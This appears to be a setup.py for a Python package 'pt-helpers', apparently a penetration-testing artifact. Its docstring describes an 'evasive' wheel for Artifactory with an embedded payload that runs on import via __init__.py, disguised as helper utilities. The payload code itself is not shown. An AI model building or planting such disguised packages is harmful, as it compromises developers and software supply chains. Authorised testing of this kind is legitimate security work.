"""setup.py for pt-helpers (Variant C - Evasive - Wheel version).

For Artifactory deployment: Build wheel with embedded payload code.
Payload executes on package import via __init__.py
"""
from setuptools import setup, find_packages

setup(
    name='pt-helpers',
    version='1.1.0',
    description='Helper utilities for PT applications',
    author='pt-team',
    packages=find_packages(where='src'),
    package_dir={'': 'src'},
    python_requires='>=3.6',
)
